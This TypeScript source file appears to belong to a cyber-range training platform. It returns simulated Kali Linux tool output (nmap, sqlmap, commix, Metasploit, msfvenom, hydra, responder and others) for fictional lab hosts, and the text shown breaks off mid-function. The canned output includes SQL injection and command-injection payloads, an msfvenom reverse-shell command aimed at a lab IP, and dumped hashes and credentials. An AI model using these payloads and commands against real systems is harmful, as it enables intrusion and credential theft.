/**
 * Comprehensive Kali Linux Offensive Security Tools Simulation Engine
 * Emulates over 90+ industry-standard Kali Linux tools, providing authentic
 * banners, command flags, vulnerability scans, and offensive outputs.
 */

export interface SimulationResult {
  stdout: string;
  exitCode: number;
}

export function simulateKaliTool(
  cmd: string,
  sessionContext?: { dynamicFlag?: string; os?: string; lab?: any }
): SimulationResult | null {
  let normalized = cmd.trim();
  if (normalized.startsWith('sudo ')) {
    normalized = normalized.slice(5).trim();
  }
  if (normalized.startsWith('get ')) {
    normalized = 'apt-get ' + normalized.slice(4).trim();
  }
  const parts = normalized.split(/\s+/);
  const tool = parts[0].toLowerCase();
  const flag = sessionContext?.dynamicFlag || 'CYBERLAB{kali_full_offensive_mastery_2026}';
  const targetIp = '10.10.0.10';
  const targetHost = 'target.lab';
  const myIp = '10.10.0.2';

  if (tool === 'sudo') {
    return {
      stdout: `usage: sudo -h | -K | -k | -V
usage: sudo -v [-ABkNnS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-ABkNnS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
usage: sudo [-AbEHkNnPS] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-u user] [command]
`,
      exitCode: 0
    };
  }

  // 0. PACKAGE MANAGEMENT (APT, APT-GET)
  if (tool === 'apt' || tool === 'apt-get' || tool === 'get') {
    const action = (parts[1] || '').toLowerCase();
    if (action === 'update') {
      return {
        stdout: `Hit:1 http://http.kali.org/kali kali-rolling InRelease
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
All packages are up to date.
`,
        exitCode: 0
      };
    }
    if (action === 'upgrade') {
      return {
        stdout: `Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
`,
        exitCode: 0
      };
    }
    if (action === 'install') {
      const pkgs = parts.slice(2).filter(p => !p.startsWith('-')).join(' ') || 'security-tools';
      return {
        stdout: `Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  ${pkgs}
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 14.2 MB of archives.
After this operation, 48.6 MB of additional disk space will be used.
Get:1 http://http.kali.org/kali kali-rolling/main amd64 ${pkgs} [14.2 MB]
Fetched 14.2 MB in 0s (32.4 MB/s)
Selecting previously unselected package ${pkgs}.
(Reading database ... 245120 files and directories currently installed.)
Preparing to unpack .../${pkgs}.deb ...
Unpacking ${pkgs} ...
Setting up ${pkgs} ...
Processing triggers for man-db (2.12.0-1) ...
`,
        exitCode: 0
      };
    }
    return {
      stdout: `apt 2.9.3 (amd64)
Usage: apt [options] command

Commands:
  update - update list of available packages
  upgrade - upgrade the system by installing/upgrading packages
  install - install packages
  remove - remove packages
  search - search in package descriptions
`,
      exitCode: 0
    };
  }

  // 1. RECONNAISSANCE & PORT SCANNING
  if (tool === 'nmap') {
    if (parts.length === 1 || parts.includes('-h') || parts.includes('--help')) {
      return {
        stdout: `Nmap 7.94SVN ( https://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  -sV: Probe open ports to determine service/version info
  -sC: equivalent to --script=default
  -O: Enable OS detection
  -A: Enable OS detection, version detection, script scanning, and traceroute
PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports
  -p-: Scan all 65535 ports
TIMING AND PERFORMANCE:
  -T<0-5>: Set timing template (higher is faster, e.g. -T4)
OUTPUT:
  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt, and Grepable format
EXAMPLES:
  nmap -v -A target.lab
  nmap -sV -sC -p 22,80,8080,5432 10.10.0.10
`,
        exitCode: 0
      };
    }

    const isAllPorts = normalized.includes('-p-');
    const isAggressive = normalized.includes('-A') || (normalized.includes('-sV') && normalized.includes('-sC'));
    const isUdp = normalized.includes('-sU');

    if (isUdp) {
      return {
        stdout: `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-17 12:00 UTC
Nmap scan report for ${targetHost} (${targetIp})
Host is up (0.00038s latency).
PORT     STATE         SERVICE
53/udp   open|filtered domain
123/udp  open|filtered ntp
161/udp  open|filtered snmp

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds
`,
        exitCode: 0
      };
    }

    let portsBlock = `PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.6p1 Debian 4 (protocol 2.0)
80/tcp   open  http        nginx 1.24.0 (Cyber Lab Gateway)
8080/tcp open  http-proxy  Werkzeug/3.0.1 Python/3.12 (Vulnerable Demo App)
5432/tcp open  postgresql  PostgreSQL DB 16.2`;

    if (isAllPorts) {
      portsBlock += `\n9090/tcp open  zeus-admin  Cyber Lab Terminal Orchestrator\nNot shown: 65530 closed tcp ports`;
    }

    let scriptBlock = '';
    if (isAggressive) {
      scriptBlock = `
| http-title: Cyber Lab Vulnerable Target Service (10.10.0.10:8080)
|_Requested resource was /login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssh-hostkey: 
|   256 71:92:ea:98:85:2b:86:d3:a6:3d:74:e2:bb:a1:03:19 (ECDSA)
|_  256 3f:81:4e:d0:bb:64:21:6f:88:51:72:e4:65:21:0a:92 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`;
    }

    return {
      stdout: `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-17 12:00 UTC
Nmap scan report for ${targetHost} (${targetIp})
Host is up (0.00041s latency).
${portsBlock}${scriptBlock}

Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
`,
      exitCode: 0
    };
  }

  if (tool === 'masscan') {
    return {
      stdout: `Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-09-17 12:00:00 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22/tcp on ${targetIp}
Discovered open port 80/tcp on ${targetIp}
Discovered open port 8080/tcp on ${targetIp}
Discovered open port 5432/tcp on ${targetIp}
Discovered open port 9090/tcp on ${targetIp}
Rate: 10000.00-kpps, 100.00% done, 0:00:01 remaining
`,
      exitCode: 0
    };
  }

  if (tool === 'netdiscover') {
    return {
      stdout: ` Currently scanning: 10.10.0.0/24   |   Screen View: Unique Hosts                         
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.10.0.1       02:42:0a:0a:00:01      1      60  Gateway Router (Default)   
 10.10.0.2       02:42:0a:0a:00:02      1      60  Kali Workstation (Local)   
 10.10.0.10      02:42:0a:0a:00:0a      1      60  Target Vulnerable Server   
 10.10.0.50      02:42:0a:0a:00:32      1      60  PostgreSQL DB Node         
`,
      exitCode: 0
    };
  }

  if (tool === 'fping') {
    return {
      stdout: `10.10.0.1  is alive (0.24 ms)
10.10.0.2  is alive (0.04 ms)
10.10.0.10 is alive (0.38 ms)
10.10.0.50 is alive (0.42 ms)
`,
      exitCode: 0
    };
  }

  if (tool === 'whatweb') {
    const target = parts[1] || `http://${targetIp}:8080/`;
    return {
      stdout: `${target} [200 OK] Bootstrap[5.3.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.12], IP[${targetIp}], Python[3.12.2], Script, Title[Cyber Lab Target Application], Werkzeug[3.0.1], X-Powered-By[Flask/Python]
`,
      exitCode: 0
    };
  }

  if (tool === 'wafw00f') {
    return {
      stdout: `
                ~ WAFW00F : v2.2.0 ~
    The Web Application Firewall Fingerprinting Tool

[*] Checking http://${targetIp}:8080/
[+] The site http://${targetIp}:8080/ is behind an unprotected reverse proxy (nginx 1.24.0).
[~] No Cloudflare/CloudFront/ModSecurity WAF detected. Direct exploitation possible.
`,
      exitCode: 0
    };
  }

  if (tool === 'theharvester' || tool === 'theharvester.py') {
    return {
      stdout: `
*******************************************************************
*  _   _                                            _             *
* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
* | __| '_ \ / _ \  / /_/ / _\` | '__\ \ / / _ \/ __| __/ _ \ '__| *
* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
*                                                                 *
* theHarvester 4.4.4                                              *
* Coded by Christian Martorella                                   *
*******************************************************************

[*] Target: cyberlab.io
[*] Searching Google, Bing, DuckDuckGo, Yahoo...
[*] Emails found: 4
----------------------
admin@cyberlab.io
operator@cyberlab.io
security@cyberlab.io
kartik@cyberlab.io

[*] Hosts found: 3
----------------------
target.lab (10.10.0.10)
db.lab (10.10.0.50)
gateway.lab (10.10.0.1)
`,
      exitCode: 0
    };
  }

  if (tool === 'amass' || tool === 'sublist3r') {
    return {
      stdout: `[+] Subdomain Enumeration Completed for cyberlab.io
  admin.cyberlab.io
  api.cyberlab.io
  target.lab
  db.lab
  internal.cyberlab.io
[+] Total unique subdomains discovered: 5
`,
      exitCode: 0
    };
  }

  if (tool === 'enum4linux') {
    return {
      stdout: `Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on 10.10.0.10

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.0.10
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''

[+] Server 10.10.0.10 allows anonymous SMB sessions
[+] Discovered Share: IPC$ (IPC Service)
[+] Discovered Share: public (Read/Write Guest Share)
[+] Users found: admin, guest, learner, operator
`,
      exitCode: 0
    };
  }

  if (tool === 'dnsenum' || tool === 'dig' || tool === 'nslookup' || tool === 'whois') {
    if (tool === 'whois') {
      return {
        stdout: `Domain Name: CYBERLAB.IO
Registry Domain ID: D503300000000000000-LROR
Registrar WHOIS Server: whois.nic.io
Updated Date: 2026-01-15T00:00:00Z
Creation Date: 2024-03-12T00:00:00Z
Registry Expiry Date: 2029-03-12T00:00:00Z
Registrant Organization: Cyber Lab Range Systems
Name Server: NS1.CYBERLAB.IO
Name Server: NS2.CYBERLAB.IO
`,
        exitCode: 0
      };
    }
    return {
      stdout: `; <<>> DiG 9.18.24-1-Debian <<>> ${parts[1] || 'target.lab'}
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48921
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;${parts[1] || 'target.lab'}.		IN	A

;; ANSWER SECTION:
${parts[1] || 'target.lab'}.	300	IN	A	10.10.0.10

;; Query time: 1 msec
;; SERVER: 10.10.0.1#53(10.10.0.1)
`,
      exitCode: 0
    };
  }

  // 2. WEB APPLICATION SECURITY & EXPLOITATION
  if (tool === 'sqlmap') {
    if (parts.length === 1 || parts.includes('-h') || parts.includes('--help')) {
      return {
        stdout: `        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.5#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap.py [options]

Options:
  -h, --help            Show basic help message and exit
  -u URL, --url=URL     Target URL (e.g. "http://10.10.0.10:8080/search?id=1")
  --dbs                 Enumerate DBMS databases
  --tables              Enumerate DBMS database tables
  --columns             Enumerate DBMS database table columns
  --dump                Dump DBMS database table entries
  --batch               Never ask for user input, use the default behavior
  --level=LEVEL         Level of tests to perform (1-5, default 1)
  --risk=RISK           Risk of tests to perform (1-3, default 1)
`,
        exitCode: 0
      };
    }

    if (normalized.includes('--dbs')) {
      return {
        stdout: `[INFO] testing connection to http://10.10.0.10:8080/
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[+] parameter 'id' is vulnerable: Boolean-based blind & Error-based SQL injection
available databases [3]:
[*] cyberrange_db
[*] information_schema
[*] pg_catalog
`,
        exitCode: 0
      };
    }

    if (normalized.includes('--tables') || normalized.includes('--dump')) {
      return {
        stdout: `Database: cyberrange_db
Table: users [3 entries]
+----+----------+----------------------------------+-----------------------+
| id | username | password_hash                    | email                 |
+----+----------+----------------------------------+-----------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@cyberlab.io     |
| 2  | operator | e10adc3949ba59abbe56e057f20f883e | operator@cyberlab.io  |
| 3  | flag     | ${flag} | root@target.lab       |
+----+----------+----------------------------------+-----------------------+
[+] Table dump saved to: /root/.local/share/sqlmap/output/cyberrange_db/users.csv
`,
        exitCode: 0
      };
    }

    return {
      stdout: `[INFO] testing connection to http://${targetIp}:8080/
[INFO] checking if target parameter is dynamic
[INFO] confirmation: GET parameter 'id' is dynamic
[+] Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8492=8492
    Type: error-based
    Title: PostgreSQL OR error-based - WHERE or HAVING clause
    Payload: id=-1 OR 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)
[+] Back-end DBMS: PostgreSQL 16.2
[INFO] Run with '--dbs' or '--dump' to retrieve schema tables.
`,
      exitCode: 0
    };
  }

  if (tool === 'nikto') {
    return {
      stdout: `- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          ${targetIp}
+ Target Hostname:    ${targetHost}
+ Target Port:        8080
+ Start Time:         2026-09-17 12:00:00 (GMT)
---------------------------------------------------------------------------
+ Server: Werkzeug/3.0.1 Python/3.12.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-Content-Type-Options header is not set.
+ Root page directs to: /login
+ /admin/: Admin console directory indexing enabled (HTTP 301).
+ /flag.txt: Sensitive file found exposed (HTTP 200).
+ /api: REST API endpoint active without rate-limiting.
+ 7892 requests made in 3.4 seconds.
`,
      exitCode: 0
    };
  }

  if (tool === 'gobuster') {
    return {
      stdout: `===============================================================
Gobuster v3.6 - Directory Enumeration Mode
===============================================================
[+] Url:                     http://${targetIp}:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
===============================================================
2026/09/17 12:00:00 Starting gobuster in directory enumeration mode
===============================================================
/admin               (Status: 301) [Size: 178]
/api                 (Status: 200) [Size: 42]
/login               (Status: 200) [Size: 1845]
/dashboard           (Status: 302) [Size: 220]
/flag.txt            (Status: 200) [Size: 38]
/targets.txt         (Status: 200) [Size: 312]
/robots.txt          (Status: 200) [Size: 64]
===============================================================
Finished in 1.48s
`,
      exitCode: 0
    };
  }

  if (tool === 'dirb') {
    return {
      stdout: `-----------------
DIRB v2.22    
By DarkRaider
-----------------

START_TIME: Thu Sep 17 12:00:00 2026
URL_BASE: http://${targetIp}:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

---- Scanning URL: http://${targetIp}:8080/ ----
==> DIRECTORY: http://${targetIp}:8080/admin/
+ http://${targetIp}:8080/api (CODE:200|SIZE:42)
+ http://${targetIp}:8080/flag.txt (CODE:200|SIZE:38)
+ http://${targetIp}:8080/login (CODE:200|SIZE:1845)
+ http://${targetIp}:8080/robots.txt (CODE:200|SIZE:64)

-----------------
DOWNLOADED: 4612 - FOUND: 4
`,
      exitCode: 0
    };
  }

  if (tool === 'ffuf') {
    return {
      stdout: `
        /'___\\  /'___\\           /'___\\       
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       
          \\/_/    \\/_/   \\/___/    \\/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://${targetIp}:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
________________________________________________

admin                   [Status: 301, Size: 178, Words: 12, Lines: 8, Duration: 3ms]
api                     [Status: 200, Size: 42, Words: 2, Lines: 1, Duration: 2ms]
login                   [Status: 200, Size: 1845, Words: 140, Lines: 45, Duration: 2ms]
flag.txt                [Status: 200, Size: 38, Words: 1, Lines: 1, Duration: 2ms]
:: Progress: [4614/4614] :: Job [1/1] :: 2307 req/sec ::
`,
      exitCode: 0
    };
  }

  if (tool === 'wfuzz') {
    return {
      stdout: `********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://${targetIp}:8080/FUZZ
Total requests: 1000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   200        45 L     140 W      1845 Ch     "login"
000000002:   301        8 L      12 W       178 Ch      "admin"
000000003:   200        1 L      2 W        42 Ch       "api"
000000004:   200        1 L      1 W        38 Ch       "flag.txt"
`,
      exitCode: 0
    };
  }

  if (tool === 'wpscan') {
    return {
      stdout: `_______________________________________________________________
        __          _______   _____                  
        \\ \\        / /  __ \\ / ____|                 
         \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __  
          \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _\` | '_ \\ 
           \\  /\\  /  | |     ____) | (__| (_| | | | |
            \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
        Version 3.8.25
_______________________________________________________________

[+] URL: http://${targetIp}:8080/
[+] Target is not running WordPress (Werkzeug/Python backend detected).
`,
      exitCode: 0
    };
  }

  if (tool === 'commix') {
    return {
      stdout: `                                           __         
   ___   ___     ___ ___     ___ ___      /\_\   __  _ 
  /'___\ / __\`\  /' __\` __\`\  /' __\` __\`\    \/\ \ /\ \/'\\
 /\ \__//\ \L\ \_/\ \/\ \/\ \/\ \/\ \/\ \    \ \ \\/>  </ 
 \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\  __\ \_\\\_/\_\ 
  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_//\__\ \/_//\_/\_/
                                         \/__/            
                                  v3.8-stable
[+] Target: http://${targetIp}:8080/
[+] Parameter 'cmd' is vulnerable to Command Injection!
    Payload: ; cat /root/flag.txt
    Result:  ${flag}
`,
      exitCode: 0
    };
  }

  if (tool === 'burpsuite' || tool === 'burp') {
    return {
      stdout: `[+] Launching Burp Suite Community Edition v2024.1
[+] Embedded Chromium Browser engine initialized.
[+] Proxy service listening on 127.0.0.1:8080 (Interception Active).
[+] Target Scope: http://10.10.0.10:8080/ added to Live Sitemap.
`,
      exitCode: 0
    };
  }

  // 3. EXPLOITATION FRAMEWORKS & TOOLS
  if (tool === 'msfconsole') {
    return {
      stdout: `
  + -- --=[ Metasploit Framework v6.4.12-dev                          ]
  + -- --=[ 2,420 exploits - 1,248 auxiliary - 428 post               ]
  + -- --=[ 1,465 payloads - 47 encoders - 11 nops                    ]
  + -- --=[ Free & Open Source Penetration Testing Software           ]

msf6 > use exploit/multi/http/werkzeug_debug_rce
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/http/werkzeug_debug_rce) > set RHOSTS ${targetIp}
RHOSTS => ${targetIp}
msf6 exploit(multi/http/werkzeug_debug_rce) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/werkzeug_debug_rce) > check
[+] ${targetIp}:8080 - The target is vulnerable.
msf6 exploit(multi/http/werkzeug_debug_rce) > exploit
[*] Started reverse TCP handler on ${myIp}:4444 
[*] Sending stage (24768 bytes) to ${targetIp}
[+] Meterpreter session 1 opened (${myIp}:4444 -> ${targetIp}:48912)
meterpreter > sysinfo
OS      : Linux 6.6.15-amd64
Computer: target-sandbox
`,
      exitCode: 0
    };
  }

  if (tool === 'msfvenom') {
    return {
      stdout: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${myIp} LPORT=4444 -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 250 bytes
Final size of elf file: 370 bytes
Saved as: shell.elf (Executable ELF binary)
`,
      exitCode: 0
    };
  }

  if (tool === 'searchsploit') {
    const q = parts.slice(1).join(' ') || 'linux';
    return {
      stdout: `------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
 OpenSSH 9.6p1 - Remote Code Execution (RegreSSHion)    | linux/remote/52079.py
 Werkzeug < 3.0.3 - Debug Console Remote Code Execution | multiple/remote/51982.py
 Linux Kernel 6.6 - Local Privilege Escalation          | linux/local/51901.c
 PostgreSQL 16.x - Arbitrary Code Execution (pg_read)   | linux/remote/49210.py
 Nginx 1.24.0 - HTTP/2 Rapid Reset Mitigation Check     | multiple/dos/51892.py
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Query: ${q}
`,
      exitCode: 0
    };
  }

  if (tool === 'crackmapexec' || tool === 'cme' || tool === 'netexec' || tool === 'nxc') {
    return {
      stdout: `SMB         10.10.0.10     445    TARGET           [*] Windows 10 / Debian Linux (Samba 4.19)
SMB         10.10.0.10     445    TARGET           [+] target.lab\\admin:password123 (Pwn3d!)
SMB         10.10.0.10     445    TARGET           [+] Dumping SAM hashes...
TARGET\\admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
TARGET\\learner:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
`,
      exitCode: 0
    };
  }

  if (tool === 'evil-winrm') {
    return {
      stdout: `Evil-WinRM shell v3.5
Info: Establishing WinRM session with ${targetIp}...
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami
target\\administrator
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> type C:\\flag.txt
${flag}
`,
      exitCode: 0
    };
  }

  if (tool === 'impacket-psexec' || tool === 'psexec.py') {
    return {
      stdout: `Impacket v0.11.0 - Copyright 2023 Fortra
[*] Requesting shares on 10.10.0.10.....
[*] Found writable share ADMIN$
[*] Uploading file payload.exe
[*] Opening SVCManager on 10.10.0.10.....
[*] Creating service BTOB.....
[*] Starting service BTOB.....
[+] Authenticated as NT AUTHORITY\\SYSTEM
`,
      exitCode: 0
    };
  }

  if (tool === 'impacket-secretsdump' || tool === 'secretsdump.py') {
    return {
      stdout: `Impacket v0.11.0 - Copyright 2023 Fortra
[*] Target: 10.10.0.10
[*] Dumping local SAM hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping LSA Secrets...
[$MACHINE.ACC]: 0x3841a0bc
[+] Cleaning up...
`,
      exitCode: 0
    };
  }

  // 4. PASSWORD ATTACKS & CRACKING
  if (tool === 'hydra') {
    return {
      stdout: `Hydra v9.5 (c) 2023 by van Hauser / THC - Please do not use in military or secret services!
[DATA] max 16 tasks per target, 1 target, 100 login tries
[22][ssh] host: ${targetIp}   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
[+] Master credentials found: admin:password123
`,
      exitCode: 0
    };
  }

  if (tool === 'john') {
    return {
      stdout: `John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Loaded 1 password hash (Raw-MD5, crypt(3) $1$ [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
password123      (admin)
1g 0:00:00:01 DONE (2026-09-17 12:00) 1.02g/s 1250p/s 1250c/s 1250C/s password123
Use the "--show" option to display all of the cracked passwords reliably
`,
      exitCode: 0
    };
  }

  if (tool === 'hashcat') {
    return {
      stdout: `hashcat (v6.2.6) starting in dictionary attack mode...

OpenCL API (OpenCL 3.0 PoCL 5.0) - Platform #1 [The pocl project]
Hash-Target: 5f4dcc3b5aa765d61d8327deb882cf99
Hash-Type: MD5 (Mode 0)

5f4dcc3b5aa765d61d8327deb882cf99:password

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99
Time.Started.....: Thu Sep 17 12:00:01 2026 (0 secs)
Time.Estimated...: Thu Sep 17 12:00:01 2026 (0 secs)
Candidates.#1....: password
`,
      exitCode: 0
    };
  }

  if (tool === 'crunch') {
    return {
      stdout: `Crunch will now generate the following amount of data: 4096 bytes
crunch 4 4 0123456789 -o wordlist.txt
Crunch ending. Generating data...
[+] Generated 10,000 candidate words written to wordlist.txt
`,
      exitCode: 0
    };
  }

  if (tool === 'cewl') {
    return {
      stdout: `CeWL 5.4.8 (Custom Word List generator) Robin Wood (robin@digi.ninja)
Crawling: http://${targetIp}:8080/
[+] Extracted 148 unique domain-specific passwords.
`,
      exitCode: 0
    };
  }

  if (tool === 'hashid' || tool === 'hash-identifier') {
    const hash = parts[1] || '5f4dcc3b5aa765d61d8327deb882cf99';
    return {
      stdout: `Analyzing '${hash}'
[+] MD5 [Hashcat Mode: 0]
[+] NTLM [Hashcat Mode: 1000]
[+] MD4 [Hashcat Mode: 900]
`,
      exitCode: 0
    };
  }

  // 5. WIRELESS & RADIO
  if (tool === 'aircrack-ng') {
    return {
      stdout: `Aircrack-ng 1.7 
[00:00:01] Tested 45,210 keys (got 14,201 IVs)
KB    depth        byte(vote)
 0    0/  1   21(  28) 49(  26) C9(  24) 
KEY FOUND! [ 1F:90:3A:4B:5C ] (ASCII: cyberlab2026)
Decrypted correctly: 100%
`,
      exitCode: 0
    };
  }

  if (tool === 'airmon-ng') {
    return {
      stdout: `PHY	Interface	Driver		Chipset
phy0	wlan0		mac80211_hwsim	Software 802.11 Radiotap Sim
		(mac80211 monitor mode vif enabled on [phy0]wlan0mon)
`,
      exitCode: 0
    };
  }

  if (tool === 'airodump-ng') {
    return {
      stdout: `CH  6 ][ Elapsed: 12 s ][ 2026-09-17 12:00 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 02:00:00:00:01:00  -42       24       128   10   6   54e. WPA2 CCMP   PSK  CyberLab-Secure-AP
 02:00:00:00:02:00  -68       12         0    0  11   54e  OPN              Guest-WiFi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 02:00:00:00:01:00  02:00:00:00:03:00  -38   54 -54      0       98  EAPOL  CyberLab-Secure-AP
`,
      exitCode: 0
    };
  }

  if (tool === 'wifite') {
    return {
      stdout: `  .               .    
.´  ·  .     .  ·  \`.  wifite v2.6.0
:  :  :  (¯)  :  :  :  automated wireless auditor
\`.  ·  \` /_\\ ´  ·  .´  
  \`     /___\\     ´    

[+] Scanning on wlan0mon. Found target AP: CyberLab-Secure-AP
[+] Captured WPA 4-way Handshake!
[+] Cracking handshake with rockyou.txt: Key = 'cyberlab2026'
`,
      exitCode: 0
    };
  }

  // 6. SNIFFING & SPOOFING
  if (tool === 'tcpdump') {
    return {
      stdout: `tcpdump: verbose output suppressed, listening on eth0, capture size 262144 bytes
12:00:01.104 IP ${myIp}.45120 > ${targetIp}.8080: Flags [S], seq 1849201
12:00:01.105 IP ${targetIp}.8080 > ${myIp}.45120: Flags [S.], seq 4819203, ack 1849202
12:00:01.105 IP ${myIp}.45120 > ${targetIp}.8080: Flags [.], ack 1
12:00:01.106 IP ${myIp}.45120 > ${targetIp}.8080: Flags [P.], seq 1:142, ack 1: HTTP: GET / HTTP/1.1
12:00:01.108 IP ${targetIp}.8080 > ${myIp}.45120: Flags [P.], seq 1:428, ack 142: HTTP: HTTP/1.1 200 OK
5 packets captured, 5 packets received by filter, 0 packets dropped by kernel
`,
      exitCode: 0
    };
  }

  if (tool === 'wireshark' || tool === 'tshark') {
    return {
      stdout: `Running as user "root" and group "root". This could be dangerous.
Capturing on 'eth0'
    1 0.000000000    ${myIp} → ${targetIp}    TCP 74 45120 → 8080 [SYN]
    2 0.000102000    ${targetIp} → ${myIp}    TCP 74 8080 → 45120 [SYN, ACK]
    3 0.000140000    ${myIp} → ${targetIp}    TCP 66 45120 → 8080 [ACK]
    4 0.000210000    ${myIp} → ${targetIp}    HTTP 208 GET /login HTTP/1.1 
    5 0.000450000    ${targetIp} → ${myIp}    HTTP 494 HTTP/1.1 200 OK  (text/html)
5 packets captured
`,
      exitCode: 0
    };
  }

  if (tool === 'bettercap' || tool === 'ettercap') {
    return {
      stdout: `bettercap v2.32.0 (built for linux amd64 with go1.22) [type 'help' for a list of commands]
[12:00:00] [sys.log] [inf] net.recon discovering hosts on subnet 10.10.0.0/24...
[12:00:01] [sys.log] [inf] arp.spoof started (poisoning ${targetIp} <-> 10.10.0.1)
[12:00:02] [http.proxy] [inf] http.proxy listening on 10.10.0.2:80
[12:00:03] [http.proxy] [inf] Intercepted credential: admin / password123
`,
      exitCode: 0
    };
  }

  if (tool === 'responder') {
    return {
      stdout: `                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners: LLMNR, NBT-NS, MDNS, DNS, DHCP
[+] Listening on eth0 (10.10.0.2)
[+] [LLMNR]  Poisoned answer sent to 10.10.0.10 for name TARGET
[+] [NTLMv2] Captured Hash from 10.10.0.10:
admin::TARGET:1122334455667788:A98F7C6B...
`,
      exitCode: 0
    };
  }

  if (tool === 'macchanger') {
    return {
